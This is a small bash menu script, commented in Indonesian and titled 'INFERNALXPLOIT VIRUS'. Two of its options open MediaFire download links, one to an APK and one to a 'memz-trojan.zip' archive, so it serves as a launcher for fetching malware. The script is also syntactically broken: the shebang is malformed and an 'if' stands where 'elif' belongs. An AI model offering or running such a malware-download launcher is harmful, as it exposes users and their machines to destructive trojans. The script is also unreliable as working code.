!/bin/bash

# Warna
RED='\033[0;31m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # Reset warna

# Membersihkan layar
clear

# Menampilkan banner
echo -e "${CYAN}=============================="
echo -e "${RED}     INFERNALXPLOIT VIRUS"
echo -e "${CYAN}==============================${NC}"

# Menampilkan menu
echo -e "${WHITE}1. ${CYAN}OPEN VIRUS1"
echo -e "${WHITE}2. ${CYAN}OPEN VIRUS2${NC}"
echo -e "${WHITE}3. ${CYAN}Exit${NC}"
echo -ne "${WHITE}Pilih opsi: ${NC}"
read pilihan

if [ "$pilihan" == "1" ]; then
    xdg-open "https://www.mediafire.com/file/m64038aj7hqquta/VirtualXposed.apk/file"
if [ "$pilihan" == "2" ]; then
    xdg-open "https://www.mediafire.com/file/0y52ny2uyvv9yj9/memz-trojan.zip/file"
elif [ "$pilihan" == "3" ]; then
    echo -e "${RED}Keluar...${NC}"
    exit
else
    echo -e "${RED}Pilihan tidak valid!${NC}"
fi
